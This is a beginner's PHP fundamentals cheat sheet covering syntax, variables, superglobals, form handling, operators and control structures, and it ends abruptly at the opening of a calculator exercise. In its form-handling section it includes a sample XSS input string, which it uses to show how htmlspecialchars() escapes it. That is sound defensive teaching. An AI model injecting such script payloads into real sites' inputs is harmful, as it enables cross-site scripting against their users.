# 📝 PHP Fundamentals — Cheat Sheet

> **Author:** Jasmin Sultana Shimu  
> **Purpose:** Personal reference guide while learning PHP fundamentals  
> **Last Updated:** February 2026

---

## 📑 Table of Contents

1. [PHP Syntax Essentials](#1--php-syntax-essentials)
2. [Mixing PHP with HTML](#2--mixing-php-with-html)
3. [Variables & Naming Conventions](#3--variables--naming-conventions)
4. [Data Types](#4--data-types)
5. [Superglobal Variables](#5--superglobal-variables)
6. [Handling Form Data](#6--handling-form-data)
7. [Operators](#7--operators)
8. [Control Structures](#8--control-structures)
9. [Exercise: Build a Calculator](#9--exercise-build-a-calculator)
10. [Arrays](#10--arrays)
11. [Built-in Functions](#11--built-in-functions)
12. [User-Defined Functions](#12--user-defined-functions)
13. [Variable Scope](#13--variable-scope)
14. [Constants](#14--constants)
15. [Loops](#15--loops)
16. [Sessions](#16--sessions)
17. [Session Security](#17--session-security)
18. [Password Hashing](#18--password-hashing)
19. [UPDATE & DELETE via PHP](#19--update--delete-via-php)
20. [Login System — Signup (Part 1)](#20--login-system--signup-part-1)
21. [Login System — Login & Logout (Part 2)](#21--login-system--login--logout-part-2)
22. [PHP Security — Complete Guide](#22--php-security--complete-guide)

---

## 1. 🔤 PHP Syntax Essentials

### 1.1 PHP Tags

| **Why**   | PHP code must be wrapped in special tags so the server knows what to process as PHP vs plain HTML. |
| --------- | -------------------------------------------------------------------------------------------------- |
| **How**   | Use `<?php ... ?>` to open and close a PHP block.                                                  |
| **Where** | In any `.php` file — at the top, inside HTML, or standalone.                                       |

```php
<?php
  // All PHP code goes here
?>
```

> **💡 Best Practice:** If your file is **pure PHP** (no HTML), omit the closing `?>` tag. This prevents accidental whitespace/newline issues that can cause "headers already sent" errors.

---

### 1.2 Printing / Output

| **Why**   | To send text, HTML, or data from the server to the browser. |
| --------- | ----------------------------------------------------------- |
| **How**   | Use `echo` — the most common output statement in PHP.       |
| **Where** | Anywhere inside `<?php ... ?>` tags.                        |

**Two ways to use `echo`:**

```php
<?php
// Way 1: Print plain text
echo "Hello World!";

// Way 2: Print HTML from within PHP
echo "<b>Hello World</b>";
?>
```

> **💡 Pro Tip: `echo` vs `print`**  
> - `echo` — Slightly faster, can accept multiple comma-separated arguments: `echo "Hello", " ", "World";`  
> - `print` — Always returns `1`, so it can be used in expressions: `$result = print "Hello";`  
> - **Use `echo` 99% of the time.** It's the PHP community standard.

---

### 1.3 Comments

| **Why**   | To explain code, leave notes for yourself/others, or temporarily disable code. |
| --------- | ------------------------------------------------------------------------------ |
| **How**   | Use `//` for single-line or `/* ... */` for multi-line comments.               |
| **Where** | Anywhere inside `<?php ... ?>` blocks.                                         |

```php
<?php
// This is a single-line comment

/* This is a
   multi-line
   comment */

# This is also a single-line comment (less common, but valid)
?>
```

> **💡 Best Practice:** Write comments that explain **why** something is done, not **what** it does. The code itself should be readable enough to show the *what*.

---

## 2. 🔀 Mixing PHP with HTML

### 2.1 Embedding PHP Inside HTML

| **Why**   | PHP is a server-side language designed to generate dynamic HTML pages. Mixing them lets you create pages that change based on data. |
| --------- | ----------------------------------------------------------------------------------------------------------------------------------- |
| **How**   | Place `<?php ... ?>` tags anywhere inside your HTML. The server processes the PHP and sends only the resulting HTML to the browser. |
| **Where** | In any `.php` file — inline within tags, between tags, or in attribute values.                                                      |

```php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
</head>
<body>

    <!-- Static HTML -->
    <p>This is a paragraph.</p>

    <!-- PHP injected inside HTML -->
    <p>This is a <?php echo "awesome"; ?> paragraph.</p>

    <!-- Full paragraph from PHP -->
    <?php echo "<p>This is ALSO a paragraph.</p>"; ?>

</body>
</html>
```

---

### 2.2 Using Variables in HTML

| **Why**   | To display dynamic data (e.g., user names, prices, dates) in your HTML pages.  |
| --------- | ------------------------------------------------------------------------------ |
| **How**   | Define variables in a PHP block, then `echo` them inside HTML wherever needed. |
| **Where** | Anywhere you want dynamic content in your `.php` templates.                    |

```php
<?php
$user_name = "Jasmin Sultana Shimu";
?>

<p>Hi! My name is <?php echo $user_name; ?>, and I'm learning PHP!</p>
```

**Output:**
```
Hi! My name is Jasmin Sultana Shimu, and I'm learning PHP!
```

> **💡 Pro Tip:** You can also assign one variable to another:  
> ```php
> $test = $user_name;  // $test now holds the same value
> echo $test;          // Outputs: Jasmin Sultana Shimu
> ```

---

### 2.3 Conditional HTML Output

| **Why**   | To show or hide blocks of HTML based on a condition (e.g., show a welcome message only if the user is logged in). |
| --------- | ----------------------------------------------------------------------------------------------------------------- |
| **How**   | Wrap HTML blocks between PHP `if` statements. The HTML between the tags only renders if the condition is `true`.  |
| **Where** | In templates where sections of the page depend on logic.                                                          |

```php
<?php if (true) { ?>
    <p>This HTML only shows when the condition is true.</p>
<?php } ?>
```

> **💡 Best Practice:** For cleaner templates, use the alternative syntax:  
> ```php
> <?php if ($isLoggedIn): ?>
>     <p>Welcome back!</p>
> <?php else: ?>
>     <p>Please log in.</p>
> <?php endif; ?>
> ```

---

## 3. 📦 Variables & Naming Conventions

### 3.1 Variables

| **Why**   | Variables store data (text, numbers, etc.) that your program can use and manipulate.                                                     |
| --------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| **How**   | All PHP variables start with `$` followed by the name. No need to declare a type — PHP figures it out automatically (dynamically typed). |
| **Where** | Inside any `<?php ... ?>` block.                                                                                                         |

```php
<?php
$name = "Jasmin Sultana Shimu";
echo $name;  // Output: Jasmin Sultana Shimu
?>
```

**Rules for variable names:**
- Must start with `$` followed by a letter or underscore `_`
- Cannot start with a number (`$1name` ❌)
- Case-sensitive (`$Name` and `$name` are different variables)

---

### 3.2 Naming Conventions

| **Why**   | Consistent naming makes code readable, maintainable, and professional. |
| --------- | ---------------------------------------------------------------------- |
| **How**   | PHP developers follow these common conventions.                        |
| **Where** | Every variable, function, and class you write.                         |

| Convention            | Example          | Status                                 |
| --------------------- | ---------------- | -------------------------------------- |
| **camelCase**         | `$firstName`     | ✅ Recommended for variables            |
| **Underscore prefix** | `$_name`         | ✅ Valid (often for private/internal)   |
| **snake_case**        | `$first_name`    | ✅ Common & accepted                    |
| **PascalCase**        | `$UserFirstName` | ✅ Typically used for class names       |
| **Hyphenated**        | `$first-name`    | ❌ **Invalid** — PHP reads `-` as minus |

> **💡 Best Practice:** Pick **one** convention and stick to it throughout your project. Most modern PHP (PSR-12) uses:  
> - `$camelCase` for variables and function parameters  
> - `snake_case` for database column names  
> - `PascalCase` for class names  

---

## 4. 📊 Data Types

### 4.1 Scalar Types (Hold a single value)

| **Why**   | Scalar types are the building blocks of all data in PHP. Every piece of information starts as one of these. |
| --------- | ----------------------------------------------------------------------------------------------------------- |
| **How**   | Just assign a value — PHP automatically detects the type.                                                   |
| **Where** | Everywhere — variables, function parameters, return values.                                                 |

| Type        | Example             | Default Value       |
| ----------- | ------------------- | ------------------- |
| **String**  | `$name = "Shimu";`  | `""` (empty string) |
| **Integer** | `$age = 25;`        | `0`                 |
| **Float**   | `$price = 2.34;`    | `0.0`               |
| **Boolean** | `$isActive = true;` | `false`             |

```php
<?php
$string = "Shimu";       // String
$int    = 12345678;       // Integer
$float  = 2.34567;        // Float (also called Double)
$bool   = true;           // Boolean — can only be true or false
?>
```

> **⚠️ Common Mistake:**  
> Writing `$bool = true or false;` does **not** mean "true or false". Due to operator precedence, `=` runs before `or`, so it always assigns `true` to `$bool`.  
> **Correct:** `$bool = true;` or `$bool = false;`

---

### 4.2 Compound Types (Hold multiple values)

| **Why**   | To group related data together (e.g., a list of colors, a user object).           |
| --------- | --------------------------------------------------------------------------------- |
| **How**   | Use arrays for ordered collections and objects for structured data with behavior. |
| **Where** | When you need to work with collections of data or model real-world entities.      |

```php
<?php
// Array — Method 1 (older syntax)
$colors = array("Red", "Green", "Blue");

// Array — Method 2 (modern shorthand, preferred)
$colors2 = ["Yellow", "Violet", "Mint"];

// Default empty array
$emptyArray = [];

// Object (covered in OOP section later)
// $car = new Car();
// $nullObject = null;
?>
```

> **💡 Pro Tip:** Always use the short array syntax `[]` over `array()`. It's cleaner and the modern PHP standard since PHP 5.4.

---

### 4.3 Quick Type Reference

| Category     | Types                            | Can hold                          |
| ------------ | -------------------------------- | --------------------------------- |
| **Scalar**   | `string`, `int`, `float`, `bool` | A single value                    |
| **Compound** | `array`, `object`                | Multiple values / structured data |
| **Special**  | `null`, `resource`               | Nothing / external reference      |

> **💡 Pro Tip:** Use `var_dump($variable);` to inspect the **type and value** of any variable during debugging. It's more informative than `echo`.

---

## 5. 🌐 Superglobal Variables

### 5.1 What Are Superglobals?

| **Why**   | PHP provides built-in (predefined) variables that are accessible from **anywhere** in your code — inside functions, classes, or files — without needing `global`. |
| --------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **How**   | They are automatically populated by PHP. Just use them by name.                                                                                                   |
| **Where** | Any `.php` file, any scope.                                                                                                                                       |

---

### 5.2 `$_SERVER` — Server & Request Info

| **Why**   | To get information about the server environment, the current script, and the HTTP request. |
| --------- | ------------------------------------------------------------------------------------------ |
| **How**   | Access specific keys like an associative array.                                            |
| **Where** | Useful for routing, logging, security checks, and debugging.                               |

```php
<?php
echo $_SERVER["DOCUMENT_ROOT"];    // e.g., C:/xampp/htdocs
echo $_SERVER["PHP_SELF"];         // e.g., /PHPMastery/index.php
echo $_SERVER["SERVER_NAME"];      // e.g., localhost
echo $_SERVER["REQUEST_METHOD"];   // e.g., GET or POST
?>
```

| Key              | Returns                                |
| ---------------- | -------------------------------------- |
| `DOCUMENT_ROOT`  | Root directory of the server           |
| `PHP_SELF`       | Path of the currently executing script |
| `SERVER_NAME`    | Name of the server host                |
| `REQUEST_METHOD` | HTTP method used (GET, POST, etc.)     |

---

### 5.3 `$_GET` — URL Query Parameters

| **Why**   | To retrieve data passed through the URL (query string).                       |
| --------- | ----------------------------------------------------------------------------- |
| **How**   | Data appears after `?` in the URL. Multiple values separated by `&`.          |
| **Where** | Search pages, filters, pagination — anything where data is **not sensitive**. |

```php
// URL: http://localhost/phpmastery/index.php?name=shimu&eyecolor=black

<?php
echo $_GET["name"];      // Output: shimu
echo $_GET["eyecolor"];  // Output: black
?>
```

**Key characteristics:**
- ✅ Submits data via URL
- ✅ Visible in the address bar
- ✅ Can be bookmarked
- ❌ **Not for sensitive data** (passwords, personal info)
- 🎯 **Use when:** Retrieving/displaying data from a database, search queries

---

### 5.4 `$_POST` — Hidden Form Data

| **Why**   | To retrieve data submitted through a form using the POST method.     |
| --------- | -------------------------------------------------------------------- |
| **How**   | Form data is sent in the HTTP request body — not visible in the URL. |
| **Where** | Login forms, registration, any form submitting **sensitive data**.   |

```php
<?php
echo $_POST["name"];  // Retrieves 'name' field from a POST form
?>
```

**Key characteristics:**
- ✅ Data is **not visible** in the URL
- ✅ More secure for sensitive data
- ✅ No character limit on data size
- ❌ Cannot be bookmarked
- 🎯 **Use when:** Submitting data to a website or database

---

### 5.5 `$_REQUEST` — Combined GET + POST + Cookies

| **Why**   | A catch-all that can read data from GET, POST, and COOKIE sources. |
| --------- | ------------------------------------------------------------------ |
| **How**   | Same syntax as `$_GET` or `$_POST`.                                |
| **Where** | When you don't care how the data was sent.                         |

```php
<?php
echo $_REQUEST["name"];  // Works whether data came from GET or POST
?>
```

> **⚠️ Caution:** Avoid `$_REQUEST` in production. It's ambiguous — you can't tell where the data came from. Use `$_GET` or `$_POST` explicitly for clarity and security.

---

### 5.6 `$_FILES` — Uploaded File Data

| **Why**   | To access information about files uploaded through an HTML form. |
| --------- | ---------------------------------------------------------------- |
| **How**   | The form must use `enctype="multipart/form-data"`.               |
| **Where** | Profile picture uploads, document uploads, any file input.       |

```php
<?php
// Access uploaded file info
$fileName = $_FILES["fileInput"]["name"];     // Original file name
$fileSize = $_FILES["fileInput"]["size"];     // Size in bytes
$fileTmp  = $_FILES["fileInput"]["tmp_name"]; // Temporary location on server
?>
```

---

### 5.7 `$_COOKIE` — Browser Cookies

| **Why**   | To read small pieces of data stored in the user's browser. |
| --------- | ---------------------------------------------------------- |
| **How**   | Set with `setcookie()`, read with `$_COOKIE`.              |
| **Where** | "Remember Me" features, user preferences, tracking.        |

```php
<?php
// Setting a cookie (expires in 1 hour)
setcookie("username", "Shimu", time() + 3600);

// Reading a cookie
echo $_COOKIE["username"];  // Output: Shimu
?>
```

**Cookie Logic:**
- 🍪 Small file stored **in the browser**
- 📤 Sent back to the server with **every** request
- ✅ Great for "Remember Me" or user preferences
- ❌ Can be modified by the user — **don't store sensitive data**

> **⚠️ Note:** The superglobal is `$_COOKIE` (no "S"), not `$_COOKIES`.

---

### 5.8 `$_SESSION` — Server-Side Sessions

| **Why**   | To store data on the **server** that persists across multiple page loads for a single user.             |
| --------- | ------------------------------------------------------------------------------------------------------- |
| **How**   | Call `session_start()` at the top of every page that uses sessions. Then use `$_SESSION` like an array. |
| **Where** | Login systems ("is the user logged in?"), shopping carts, multi-step forms.                             |

```php
<?php
session_start();  // MUST be called before any output

$_SESSION["username"] = "Jasmin";
echo $_SESSION["username"];  // Output: Jasmin
?>
```

**Session Logic:**
- 🔒 Stored on the **server** (much more secure than cookies)
- ⏳ Temporary — usually ends when the browser closes
- ✅ Used for sensitive info like login status
- 🎯 Always call `session_start()` before using `$_SESSION`

---

### 5.9 `$_ENV` — Environment Variables

| **Why**   | To access server-side configuration values and keep secrets (API keys, DB passwords) out of your code. |
| --------- | ------------------------------------------------------------------------------------------------------ |
| **How**   | Data comes from the operating system or a `.env` file.                                                 |
| **Where** | Database credentials, API keys, app configuration.                                                     |

```php
<?php
echo $_ENV["DB_HOST"];  // e.g., localhost (set in your .env or server config)
?>
```

> **💡 Best Practice:** Never hardcode passwords or API keys. Use environment variables and a `.env` file (with a library like `vlucas/phpdotenv`).

---

### 5.10 Superglobals Summary

| Superglobal | Purpose                      | Data Source         |
| ----------- | ---------------------------- | ------------------- |
| `$_SERVER`  | Server & request info        | Web server          |
| `$_GET`     | URL query parameters         | URL `?key=value`    |
| `$_POST`    | Form data (hidden)           | HTTP request body   |
| `$_REQUEST` | Combined GET + POST + Cookie | Multiple sources    |
| `$_FILES`   | Uploaded file info           | Form with `enctype` |
| `$_COOKIE`  | Browser cookie data          | Client-side cookies |
| `$_SESSION` | Server-side session data     | Server memory       |
| `$_ENV`     | Environment variables        | OS / `.env` file    |

---

## 6. 📬 Handling Form Data

### 6.1 Creating an HTML Form

| **Why**   | Forms are the primary way users send data to your PHP server (login, registration, search, etc.). |
| --------- | ------------------------------------------------------------------------------------------------- |
| **How**   | Use an HTML `<form>` with `action` (where to send) and `method` (GET or POST).                    |
| **Where** | Any page that collects user input.                                                                |

```php
<!-- Recommended: Send data to a separate handler file -->
<form action="formhandler.php" method="post">

    <label>First Name:</label>
    <input type="text" name="firstname" placeholder="First name...">
    <br>

    <label for="lastname">Last Name:</label>
    <input type="text" name="lastname" placeholder="Last name...">
    <br>

    <select name="favouritepet">
        <option value="none">None</option>
        <option value="dog">Dog</option>
        <option value="cat">Cat</option>
        <option value="bird">Bird</option>
    </select>
    <br>

    <button type="submit" name="submit">Submit</button>
</form>
```

> **💡 Pro Tip:** You can send form data to the same page using `$_SERVER["PHP_SELF"]`:  
> ```php
> <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
> ```  
> However, this is **not recommended** for beginners — it mixes display logic with processing logic. Use a separate handler file instead.

---

### 6.2 Processing Form Data (The Handler)

| **Why**   | The handler file receives, validates, and processes the data submitted by the form. |
| --------- | ----------------------------------------------------------------------------------- |
| **How**   | Check the request method, sanitize input, then use the data.                        |
| **Where** | In a dedicated PHP file (e.g., `formhandler.php`).                                  |

```php
<?php
// Step 1: Check if the form was submitted via POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // Step 2: Sanitize user input to prevent XSS attacks
    $firstName     = htmlspecialchars($_POST["firstname"]);
    $lastName      = htmlspecialchars($_POST["lastname"]);
    $favouritePets = htmlspecialchars($_POST["favouritepet"]);

    // Step 3: Validate — check if required fields are empty
    if (empty($firstName)) {
        header("Location: form.php");  // Redirect back to form
        exit();                        // ALWAYS exit after header redirect
    }

    // Step 4: Use the data
    echo "Submitted Data:";
    echo "<br>" . $firstName;
    echo "<br>" . $lastName;
    echo "<br>" . $favouritePets;

} else {
    // If someone tries to access this page directly (not via form), redirect them
    header("Location: form.php");
    exit();
    // Tip: For files in subdirectories: header("Location: ../folder/fileName.php");
}
?>
```

---

### 6.3 Key Concepts in Form Handling

#### `htmlspecialchars()` vs `htmlentities()`

| Function             | What It Does                                                               |
| -------------------- | -------------------------------------------------------------------------- |
| `htmlspecialchars()` | Converts **special** characters (`<`, `>`, `&`, `"`, `'`) to HTML entities |
| `htmlentities()`     | Converts **all applicable** characters to HTML entities                    |

```php
<?php
$input = '<script>alert("hacked")</script>';

echo htmlspecialchars($input);
// Output: &lt;script&gt;alert(&quot;hacked&quot;)&lt;/script&gt;
// The browser displays it as text, not as executable code
?>
```

> **Why sanitize?** Without `htmlspecialchars()`, a malicious user could inject JavaScript into your page (**XSS attack**). Always sanitize any data that came from a user.

---

#### Checking the Request Method

```php
<?php
// ✅ Recommended way — checks the actual HTTP method
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Process form...
}

// ❌ Less reliable — only checks if 'submit' button was clicked
if (isset($_POST["submit"])) {
    // Process form...
}
?>
```

> **Why is `$_SERVER["REQUEST_METHOD"]` better?**  
> `isset($_POST["submit"])` fails if someone submits the form by pressing Enter instead of clicking the button. The request method check is more reliable.

---

#### `header()` and `exit()` — Redirecting

```php
<?php
// ALWAYS call exit() after header() — otherwise PHP continues executing code below
header("Location: form.php");
exit();
?>
```

> **⚠️ Common Bug:** If you call `exit()` **before** `header()`, the redirect never happens because the script already stopped. Always: `header()` first → `exit()` second.

---

#### Debugging Tip: `var_dump()`

```php
<?php
// See what method the form is using
var_dump($_SERVER["REQUEST_METHOD"]);  // Output: string(4) "POST"

// Inspect all submitted POST data
var_dump($_POST);
?>
```

---

## 7. ➕ Operators

### 7.1 String Operator (Concatenation)

| **Why**   | To join (concatenate) two or more strings together.                      |
| --------- | ------------------------------------------------------------------------ |
| **How**   | Use the dot `.` operator.                                                |
| **Where** | Building messages, creating dynamic HTML, combining variables with text. |

```php
<?php
$a = "Hello";
$b = "World!";
$c = $a . " " . $b;
echo $c;  // Output: Hello World!
?>
```

> **💡 Pro Tip:** You can also use `.=` to append to an existing string:  
> ```php
> $greeting = "Hello";
> $greeting .= " World!";  // $greeting is now "Hello World!"
> ```

---

### 7.2 Arithmetic Operators

| **Why**   | To perform mathematical calculations.              |
| --------- | -------------------------------------------------- |
| **How**   | Standard math symbols, plus PHP-specific ones.     |
| **Where** | Calculations, counters, pricing logic, statistics. |

| Operator | Name                | Example   | Result |
| -------- | ------------------- | --------- | ------ |
| `+`      | Addition            | `1 + 2`   | `3`    |
| `-`      | Subtraction         | `2 - 7`   | `-5`   |
| `*`      | Multiplication      | `3 * 4`   | `12`   |
| `/`      | Division            | `4 / 2`   | `2`    |
| `%`      | Modulus (remainder) | `10 % 3`  | `1`    |
| `**`     | Exponentiation      | `10 ** 3` | `1000` |

---

### 7.3 Operator Precedence (Order of Operations)

| **Why**   | Without understanding precedence, calculations may produce unexpected results.                                          |
| --------- | ----------------------------------------------------------------------------------------------------------------------- |
| **How**   | PHP follows standard math rules: parentheses → exponents → multiplication/division → addition/subtraction (**PEMDAS**). |
| **Where** | Any complex calculation.                                                                                                |

```php
<?php
echo (1 + 2) * 8 * (4 - 2);  // = 3 * 8 * 2 = 48

// Without parentheses:
echo 1 + 2 * 8 * 4 - 2;      // = 1 + 64 - 2 = 63 (multiplication first!)
?>
```

> **💡 Best Practice:** When in doubt, **use parentheses** to make your intent clear. It makes code more readable too.

---

### 7.4 Assignment Operators

| **Why**   | Shorthand to update a variable's value based on its current value. |
| --------- | ------------------------------------------------------------------ |
| **How**   | Combine `=` with an arithmetic operator.                           |
| **Where** | Counters, accumulators, running totals.                            |

| Operator | Longhand        | Shorthand   | Example Result  |
| -------- | --------------- | ----------- | --------------- |
| `+=`     | `$e = $e + 4`   | `$e += 4`   | Adds 4          |
| `-=`     | `$e = $e - 4`   | `$e -= 4`   | Subtracts 4     |
| `*=`     | `$e = $e * 2`   | `$e *= 2`   | Multiplies by 2 |
| `/=`     | `$e = $e / 2`   | `$e /= 2`   | Divides by 2    |
| `%=`     | `$e = $e % 3`   | `$e %= 3`   | Remainder of ÷3 |
| `.=`     | `$s = $s . "!"` | `$s .= "!"` | Appends string  |

```php
<?php
$e = 2;
$e += 4;   // $e is now 6
$e *= 2;   // $e is now 12
echo $e;   // Output: 12
?>
```

---

### 7.5 Comparison Operators

| **Why**   | To compare two values — essential for `if` statements, loops, and logic. |
| --------- | ------------------------------------------------------------------------ |
| **How**   | Returns `true` or `false`.                                               |
| **Where** | Conditions, validation, filtering.                                       |

| Operator | Name                     | Example     | Result    |
| -------- | ------------------------ | ----------- | --------- |
| `==`     | Equal (value only)       | `5 == "5"`  | `true` ✅  |
| `===`    | Identical (value + type) | `5 === "5"` | `false` ❌ |
| `!=`     | Not equal                | `5 != 8`    | `true`    |
| `!==`    | Not identical            | `5 !== "5"` | `true`    |
| `<`      | Less than                | `3 < 5`     | `true`    |
| `>`      | Greater than             | `5 > 3`     | `true`    |
| `<=`     | Less or equal            | `5 <= 5`    | `true`    |
| `>=`     | Greater or equal         | `5 >= 3`    | `true`    |
| `<=>`    | Spaceship                | `1 <=> 2`   | `-1`      |
| `<>`     | Not equal (alternative)  | `5 <> 8`    | `true`    |

> **📝 Note:** `!=` and `<>` do the same thing. `!=` is the more common/modern style. You'll see `<>` in older PHP codebases.

```php
<?php
// == checks VALUE only (type juggling)
var_dump(5 == "5");    // true — PHP converts "5" to int 5

// === checks VALUE and TYPE (strict)
var_dump(5 === "5");   // false — int vs string

// !== checks that value OR type are not identical
var_dump(5 !== "5");   // true — same value but different types

// Spaceship operator (returns -1, 0, or 1)
echo 1 <=> 2;   // -1 (left is less)
echo 2 <=> 2;   //  0 (equal)
echo 3 <=> 2;   //  1 (left is greater)
?>
```

**Using comparisons in `if` statements:**

```php
<?php
$a = 2;
$c = 4;

if ($a != $c) {
    echo "This statement is true!";   // This runs because 2 != 4
} else {
    echo "This statement is false";
}
?>
```

> **💡 Best Practice:** Always use `===` (strict comparison) instead of `==` to avoid unexpected type juggling bugs. This is one of the most common sources of PHP bugs for beginners.

---

### 7.6 Logical Operators

| **Why**   | To combine multiple conditions into one expression — essential for complex `if` statements. |
| --------- | ------------------------------------------------------------------------------------------- |
| **How**   | Use `&&` / `and` (both must be true) or `                                                   |  | ` / `or` (at least one must be true). |
| **Where** | Login checks, form validation, permission systems, any multi-condition logic.               |

| Operator | Name           | Description                             | Example                  |
| -------- | -------------- | --------------------------------------- | ------------------------ |
| `&&`     | And (symbolic) | `true` if **both** sides are true       | `$a == $b && $c == $d`   |
| `and`    | And (word)     | Same as `&&` but **lower precedence**   | `$a == $b and $c == $d`  |
| `\|\|`   | Or (symbolic)  | `true` if **at least one** side is true | `$a == $b \|\| $c == $d` |
| `or`     | Or (word)      | Same as `\|\|` but **lower precedence** | `$a == $b or $c == $d`   |
| `!`      | Not            | Inverts the boolean value               | `!$isAdmin`              |

```php
<?php
$a = 4;
$b = 4;
$c = 2;
$d = 6;

// Both conditions must be true for "and"
if ($a == $b and $c == $d) {
    echo "This statement is TRUE!";
} else {
    echo "NOT TRUE!";  // This runs — because $c (2) != $d (6)
}

// At least one condition must be true for "or"
if ($a == $b || $c == $d) {
    echo "TRUE!";  // This runs — because $a (4) == $b (4)
}
?>
```

**Precedence matters:**

```php
<?php
// PHP evaluates && before || (just like * before + in math)
// So this:
$a == $b || $c == $d && $a == $c

// Is actually read as:
$a == $b || ($c == $d && $a == $c)

// The symbolic versions (&&, ||) have HIGHER precedence than the word versions (and, or)
// Precedence order (high → low): ! → && → || → and → or
?>
```

> **💡 Best Practice:** Use `&&` and `||` (symbolic) instead of `and` and `or` (word). The word versions have lower precedence than `=`, which can cause unexpected behavior:
> ```php
> $result = true and false;   // $result is true! (= runs before and)
> $result = true && false;    // $result is false (correct)
> ```

---

### 7.7 Increment / Decrement Operators

| **Why**   | To quickly add or subtract 1 from a variable — the most common operation in loops and counters. |
| --------- | ----------------------------------------------------------------------------------------------- |
| **How**   | Place `++` or `--` before (pre) or after (post) the variable.                                   |
| **Where** | `for` loops, `while` loops, counters, pagination logic.                                         |

| Operator | Name               | What It Does                                          |
| -------- | ------------------ | ----------------------------------------------------- |
| `++$a`   | **Pre-increment**  | Adds 1 **first**, then returns the new value          |
| `$a++`   | **Post-increment** | Returns the current value **first**, then adds 1      |
| `--$a`   | **Pre-decrement**  | Subtracts 1 **first**, then returns the new value     |
| `$a--`   | **Post-decrement** | Returns the current value **first**, then subtracts 1 |

```php
<?php
$a = 1;

echo ++$a;  // Output: 2  (adds 1 first → $a is now 2 → prints 2)
echo $a--;  // Output: 2  (prints current 2 first → then subtracts → $a is now 1)
echo $a;    // Output: 1  (confirms $a was decremented)
?>
```

**Step-by-step breakdown:**

| Step  | Expression | Output | `$a` after |
| ----- | ---------- | ------ | ---------- |
| Start | `$a = 1`   | —      | `1`        |
| 1     | `++$a`     | `2`    | `2`        |
| 2     | `$a--`     | `2`    | `1`        |
| 3     | `$a`       | `1`    | `1`        |

> **💡 Pro Tip:** In most cases (especially loops), `++$a` (pre-increment) and `$a++` (post-increment) produce the same result. The difference only matters when you use the expression's return value inline. When in doubt, use **pre-increment** `++$a` — it's microscopically faster since PHP doesn't need to store the old value.

> **⚠️ Common Usage:** You'll use these primarily in `for` loops:
> ```php
> for ($i = 0; $i < 10; $i++) {
>     echo $i;  // Prints 0 through 9
> }
> ```

---

## 8. 🔀 Control Structures

### 8.1 `if` / `else if` / `else`

| **Why**   | To execute different blocks of code based on whether a condition is true or false. The most fundamental decision-making tool in PHP. |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| **How**   | Chain `if` → `else if` → `else`. PHP checks conditions top-to-bottom and runs the **first** block that's true, then skips the rest.  |
| **Where** | Form validation, permission checks, any branching logic.                                                                             |

```php
<?php
$a = 1;
$b = 4;
$bool = true;

if ($a < $b && !$bool) {
    echo "First condition is true!";
} else if ($a > $b) {
    echo "Second condition is true!";
} else {
    echo "None of the conditions were true!";
}
?>
```

**Key notes from your code:**

- `!$bool` — The `!` (not) operator **inverts** a boolean. If `$bool = true`, then `!$bool` equals `false`.
- `else if` and `elseif` are **identical** in PHP — both work the same way.
- PHP stops checking as soon as it finds the **first true condition** — remaining `else if` blocks are skipped.

> **💡 Best Practice:** Keep your `if/else if` chains short (3–4 conditions max). If you have many specific value checks, use `switch` or `match` instead.

---

### 8.2 `switch`

| **Why**   | To compare **one variable** against many **specific values**. Cleaner than writing many `if ($a == 1)` / `else if ($a == 2)` blocks.                      |
| --------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **How**   | PHP compares the `switch` expression against each `case`. When a match is found, that block runs. `break` stops it from falling through to the next case. |
| **Where** | Menu selections, status codes, operator handling, routing by action name.                                                                                 |

```php
<?php
$a = 1;

switch ($a) {
    case 1:
        echo "The first case is correct!";
        break;
    case 2:
        echo "The second case is correct!";
        break;
    default:
        echo "None of the conditions were true!";
}
?>
```

**Key points:**

| Concept    | Explanation                                                               |
| ---------- | ------------------------------------------------------------------------- |
| `case`     | Each possible value to match against                                      |
| `break`    | **Required** — without it, PHP "falls through" and runs the next case too |
| `default`  | Runs when **no** case matches (like `else` in an if/else chain)           |
| Comparison | Uses **loose comparison** (`==`), not strict (`===`)                      |

> **⚠️ Common Bug:** Forgetting `break` causes **fall-through** — PHP executes all subsequent cases until it hits a `break` or the end of the switch. This is almost never what you want.

---

### 8.3 `match` (PHP 8.0+)

| **Why**   | A modern, stricter alternative to `switch`. Returns a value directly, uses strict comparison, and throws an error if no match is found. |
| --------- | --------------------------------------------------------------------------------------------------------------------------------------- |
| **How**   | Similar to `switch` but as an **expression** — it returns a value you can assign to a variable. No `break` needed.                      |
| **Where** | Anywhere you'd use `switch` but want cleaner, safer code.                                                                               |

```php
<?php
$u = 6;

$result = match ($u) {
    1, 3, 5 => "Variable is equal to 1, 3, or 5!",
    2       => "Variable is equal to 2!",
    default => "NONE WERE A MATCH",
};

echo $result;  // Output: NONE WERE A MATCH
?>
```

**`match` vs `switch` comparison:**

| Feature                  | `switch`                           | `match`                                          |
| ------------------------ | ---------------------------------- | ------------------------------------------------ |
| Comparison type          | Loose `==`                         | **Strict** `===`                                 |
| Returns a value?         | No                                 | **Yes** — it's an expression                     |
| Needs `break`?           | Yes                                | **No**                                           |
| Multiple values per arm? | Multiple `case` lines              | **Comma-separated**: `1, 3, 5 =>`                |
| No match found?          | Falls to `default` or does nothing | **Throws `UnhandledMatchError`** if no `default` |
| Fall-through?            | Yes (if missing `break`)           | **Never**                                        |

> **⚠️ Important:** If `$u = "5"` (string) and you match against `5` (int), `match` will **not** match because it uses `===` (strict). This would trigger the `default` case or throw an `UnhandledMatchError` if no `default` exists.

> **💡 When to use which?**
> | Scenario | Use |
> |---|---|
> | Checking a variable against specific values | `switch` or `match` |
> | Need to return/assign a value | `match` ✅ |
> | Complex conditions (ranges, multiple variables) | `if/else if` |
> | Need strict type comparison | `match` ✅ |
> | PHP version < 8.0 | `switch` (match not available) |

---

## 9. 🧮 Exercise: Build a Calculator

### 9.1 Overview

| **Why**   | A practical exercise combining forms, input sanitization, validation, control structures, and arithmetic — everything learned so far. |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------- |
| **How**   | An HTML form submits two numbers and an operator to the same page, where PHP processes and displays the result.                       |
| **Where** | A single `.php` file handling both the form display and processing.                                                                   |

---

### 9.2 The Form

```php
